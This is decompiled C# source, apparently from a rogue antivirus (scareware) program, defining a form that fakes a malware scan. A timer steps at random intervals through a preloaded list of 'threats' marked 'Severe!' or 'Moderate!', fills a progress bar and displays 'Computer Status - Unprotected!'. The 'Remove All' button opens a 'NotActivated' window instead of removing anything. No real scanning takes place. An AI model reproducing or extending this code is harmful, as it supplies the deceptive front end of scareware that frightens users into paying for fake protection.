using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

public sealed class AVScanForm : Form
{
	private Timer timer_0;

	private List<string[]> list_0 = new List<string[]>();

	private int int_0;

	private IContainer icontainer_0;

	private Panel panel1;

	private ListView listView1;

	private ColumnHeader columnHeader_0;

	private ColumnHeader columnHeader_1;

	private Class7 panel2;

	private Label label1;

	private Button button1;

	private Button button2;

	private Label label2;

	private ProgressBar progressBar1;

	private Panel panel3;

	private Label lblCompStatus;

	private PictureBox pictureBox1;

	public AVScanForm()
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0028: Expected O, but got Unknown
		InitializeComponent();
		method_2();
		timer_0 = new Timer();
		timer_0.set_Interval(new Random().Next(200, 400));
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_0.Start();
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		timer_0.set_Interval(new Random().Next(200, 4000));
		if (int_0 != list_0.Count - 1)
		{
			method_1();
			return;
		}
		timer_0.Stop();
		progressBar1.set_Value(progressBar1.get_Maximum());
		method_0();
	}

	private void method_0()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		ScanResultDialog scanResultDialog = new ScanResultDialog();
		((Form)scanResultDialog).ShowDialog();
	}

	private void method_1()
	{
		method_3(list_0[int_0]);
		int_0++;
		progressBar1.PerformStep();
	}

	private void method_2()
	{
		list_0 = Class15.smethod_0();
		progressBar1.set_Maximum(list_0.Count);
		progressBar1.set_Step(1);
	}

	private void method_3(string[] string_0)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		ListViewItem val = new ListViewItem();
		val.set_UseItemStyleForSubItems(false);
		val.get_SubItems().AddRange(string_0);
		val.get_SubItems().RemoveAt(0);
		val.get_SubItems().RemoveAt(1);
		if (string_0[1] == "Severe!")
		{
			val.get_SubItems().get_Item(0).set_ForeColor(Color.Red);
		}
		else if (string_0[1] == "Moderate!")
		{
			val.get_SubItems().get_Item(0).set_ForeColor(Color.OrangeRed);
		}
		else
		{
			val.get_SubItems().get_Item(0).set_ForeColor(Color.Olive);
		}
		val.get_SubItems().get_Item(1).set_ForeColor(Color.DarkSlateGray);
		listView1.get_Items().Add(val);
	}

	private void button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void button1_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
		NotActivated notActivated = new NotActivated();
		((Control)notActivated).Show();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008f: Expected O, but got Unknown
		//IL_0556: Unknown result type (might be due to invalid IL or missing references)
		//IL_0560: Expected O, but got Unknown
		//IL_05f5: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ff: Expected O, but got Unknown
		panel1 = new Panel();
		label2 = new Label();
		progressBar1 = new ProgressBar();
		button2 = new Button();
		button1 = new Button();
		panel2 = new Class7();
		pictureBox1 = new PictureBox();
		panel3 = new Panel();
		lblCompStatus = new Label();
		label1 = new Label();
		listView1 = new ListView();
		columnHeader_1 = new ColumnHeader();
		columnHeader_0 = new ColumnHeader();
		((Control)panel1).SuspendLayout();
		((Control)panel2).SuspendLayout();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)panel3).SuspendLayout();
		((Control)this).SuspendLayout();
		((Control)panel1).set_BackColor(SystemColors.ButtonFace);
		((Control)panel1).set_BackgroundImageLayout((ImageLayout)3);
		((Control)panel1).get_Controls().Add((Control)(object)label2);
		((Control)panel1).get_Controls().Add((Control)(object)progressBar1);
		((Control)panel1).get_Controls().Add((Control)(object)button2);
		((Control)panel1).get_Controls().Add((Control)(object)button1);
		((Control)panel1).get_Controls().Add((Control)(object)panel2);
		((Control)panel1).get_Controls().Add((Control)(object)listView1);
		((Control)panel1).set_Dock((DockStyle)5);
		((Control)panel1).set_Location(new Point(0, 0));
		((Control)panel1).set_Name("panel1");
		((Control)panel1).set_Size(new Size(673, 447));
		((Control)panel1).set_TabIndex(1);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(25, 364));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(120, 13));
		((Control)label2).set_TabIndex(33);
		((Control)label2).set_Text("C:\\Windows\\system\\....");
		((Control)progressBar1).set_Location(new Point(24, 327));
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(628, 23));
		((Control)progressBar1).set_TabIndex(32);
		((Control)button2).set_Location(new Point(20, 402));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(125, 37));
		((Control)button2).set_TabIndex(31);
		((Control)button2).set_Text("Cancel");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((Control)button1).set_Location(new Point(520, 402));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(125, 37));
		((Control)button1).set_TabIndex(30);
		((Control)button1).set_Text("Remove All");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)panel2).get_Controls().Add((Control)(object)pictureBox1);
		((Control)panel2).get_Controls().Add((Control)(object)panel3);
		((Control)panel2).get_Controls().Add((Control)(object)label1);
		((Control)panel2).set_Dock((DockStyle)1);
		((Control)panel2).set_Location(new Point(0, 0));
		panel2.method_7(0f);
		panel2.method_1(Color.FromArgb(1, 68, 208));
		panel2.method_3(Color.FromArgb(47, 98, 251));
		((Control)panel2).set_Name("panel2");
		((Control)panel2).set_Size(new Size(673, 82));
		((Control)panel2).set_TabIndex(28);
		((Control)pictureBox1).set_BackColor(Color.Transparent);
		pictureBox1.set_Image((Image)(object)Class3.smethod_26());
		((Control)pictureBox1).set_Location(new Point(52, 28));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(52, 49));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)2);
		pictureBox1.set_TabIndex(34);
		pictureBox1.set_TabStop(false);
		((Control)panel3).set_BackgroundImage((Image)(object)Class3.smethod_23());
		((Control)panel3).get_Controls().Add((Control)(object)lblCompStatus);
		((Control)panel3).set_Dock((DockStyle)1);
		((Control)panel3).set_Location(new Point(0, 0));
		((Control)panel3).set_Name("panel3");
		((Control)panel3).set_Size(new Size(673, 26));
		((Control)panel3).set_TabIndex(33);
		((Control)lblCompStatus).set_AutoSize(true);
		((Control)lblCompStatus).set_BackColor(Color.Transparent);
		((Control)lblCompStatus).set_Font(new Font("Tahoma", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblCompStatus).set_ForeColor(Color.White);
		((Control)lblCompStatus).set_Location(new Point(19, 5));
		((Control)lblCompStatus).set_Name("lblCompStatus");
		((Control)lblCompStatus).set_Size(new Size(459, 16));
		((Control)lblCompStatus).set_TabIndex(0);
		((Control)lblCompStatus).set_Text("Computer Status - Unprotected! Click here to protect your computer.");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Transparent);
		((Control)label1).set_Location(new Point(154, 36));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(411, 32));
		((Control)label1).set_TabIndex(30);
		((Control)label1).set_Text(Class13.string_1);
		listView1.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { columnHeader_1, columnHeader_0 });
		((Control)listView1).set_Location(new Point(23, 88));
		((Control)listView1).set_Name("listView1");
		((Control)listView1).set_Size(new Size(633, 233));
		((Control)listView1).set_TabIndex(27);
		listView1.set_UseCompatibleStateImageBehavior(false);
		listView1.set_View((View)1);
		columnHeader_1.set_Text("Name");
		columnHeader_1.set_Width(200);
		columnHeader_0.set_Text("Details");
		columnHeader_0.set_Width(400);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Form)this).set_ClientSize(new Size(673, 447));
		((Control)this).get_Controls().Add((Control)(object)panel1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("AVScanForm");
		((Control)this).set_Text(Class13.string_0);
		((Control)panel1).ResumeLayout(false);
		((Control)panel1).PerformLayout();
		((Control)panel2).ResumeLayout(false);
		((Control)panel2).PerformLayout();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)panel3).ResumeLayout(false);
		((Control)panel3).PerformLayout();
		((Control)this).ResumeLayout(false);
	}
}
